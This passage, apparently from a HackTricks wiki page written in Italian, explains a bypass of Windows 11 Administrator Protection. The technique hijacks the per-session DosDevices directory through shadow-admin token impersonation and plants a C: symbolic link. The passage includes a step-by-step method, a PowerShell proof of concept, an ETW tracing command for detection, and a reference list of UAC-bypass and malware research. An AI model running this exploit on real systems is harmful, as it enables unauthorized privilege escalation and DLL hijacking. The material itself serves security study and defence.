> Ad agosto 2026, Microsoft documenta ancora Administrator Protection come **anteprima Insider**: il rollout di ottobre 2025 è stato annullato ed è previsto per una data successiva. Prima di testare queste catene, verifica che **Admin Approval Mode with Administrator protection** sia effettivamente abilitato e che il dispositivo sia stato riavviato; la sola stringa di versione standard 25H2 non dimostra che la funzionalità sia attiva.<sup>[[10]](#references)</sup>

Per una panoramica completa della superficie di attacco `RAiLaunchAdminProcess` / UIAccess nelle build di anteprima di Windows 11 25H2, consulta la pagina dedicata:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” usa token shadow-admin con mappe `\Sessions\0\DosDevices/<LUID>` specifiche per sessione. La directory viene creata in modo lazy da `SeGetTokenDeviceMap` alla prima risoluzione di `\??`. Se l'attaccante impersona il token shadow-admin solo a livello **SecurityIdentification**, la directory viene creata con l'attaccante come **proprietario** (eredita `CREATOR OWNER`), consentendo link alle lettere di unità che hanno precedenza su `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Passaggi:**

1. Da una sessione con privilegi ridotti, chiama `RAiProcessRunOnce` per avviare un `runonce.exe` shadow-admin senza prompt.
2. Duplica il suo token primario come token di **identificazione** e lo impersona mentre apre `\??` per forzare la creazione di `\Sessions\0\DosDevices/<LUID>` sotto la proprietà dell'attaccante.
3. Crea lì un symlink `C:` che punta a uno storage controllato dall'attaccante; gli accessi successivi al filesystem in quella sessione risolvono `C:` nel percorso dell'attaccante, consentendo un DLL/file hijack senza prompt.

**PoC PowerShell (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Sugli host di anteprima, Administrator Protection registra approvazioni e insuccessi come eventi ETW **15031** e **15032** nel provider `Microsoft-Windows-LUA`. Gli eventi includono il SID del richiedente, il percorso dell’applicazione, l’esito, l’account amministratore gestito e il metodo di autenticazione: quindi, i tentativi ripetuti di exploit o le interazioni non riuscite con la UI non sono privi di telemetria.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Come funziona il Controllo dell'account utente](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Raccolta di tecniche di bypass UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner di compatibilità e launcher per il bypass UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adotta l'IA per generare backdoor PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operazione TrueChaos: sfruttamento di una vulnerabilità 0-day contro obiettivi governativi del Sud-est asiatico](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Elusione della protezione amministratore di Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC usando l'attività SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Bypass Always Notify di UnifiedConsent, TabTip e Narrator](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Protezione amministratore](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Chiamare server RPC locali di Windows da .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte potenzia CoolClient con un rootkit per il kernel di Windows firmato](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: un trojan Windows completamente non rilevabile, progettato per spiare, rubare e terrorizzare](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
